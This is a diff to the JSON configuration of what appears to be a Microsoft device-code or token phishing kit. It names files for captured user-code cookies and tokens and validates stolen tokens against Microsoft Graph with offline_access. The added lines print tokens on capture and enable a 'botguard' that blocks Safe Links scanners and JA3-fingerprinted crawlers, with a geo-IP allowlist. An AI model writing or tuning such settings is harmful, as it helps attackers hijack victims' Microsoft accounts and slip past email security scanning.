@@ -14,6 +14,7 @@
   "userCodesFile": "successful_user_code_cookies.txt",
   "logFile": "logfile.txt",
   "tokenFile": "tokens.txt",
+  "visitLogFile": "visits.tsv",
   "threemaOn": false,
   "threemaTo": ["YourID1", "YourID2"],
   "threemaFrom": "YourName",
@@ -25,5 +26,12 @@
   "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
   "geoipallowlist": ["US", "CA"],
   "validateTokens": true,
-  "graphValidationScope": "https://graph.microsoft.com/.default offline_access"
+  "printTokensOnCapture": true,
+  "graphValidationScope": "https://graph.microsoft.com/.default offline_access",
+  "botguard": {
+    "enabled": true,
+    "jsChallenge": false,
+    "safelinksBlock": true,
+    "blockedJa3": []
+  }
 }
